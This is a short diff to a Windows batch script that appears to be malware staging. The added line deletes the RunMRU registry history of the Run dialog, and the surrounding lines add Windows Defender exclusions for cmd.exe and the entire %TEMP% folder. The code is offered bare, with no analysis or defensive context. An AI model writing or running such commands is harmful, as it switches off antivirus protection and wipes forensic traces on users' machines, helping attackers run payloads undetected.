@@ -1,5 +1,6 @@
 ÿþ&cls(@echo off
 
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
 powershell -Command "Add-MpPreference -ExclusionProcess cmd.exe -Force"
 powershell -Command "Add-MpPreference -ExclusionPath \"%TEMP%\cmd.exe\" -Force"
 powershell -Command "Add-MpPreference -ExclusionPath \"%TEMP%\" -Force"
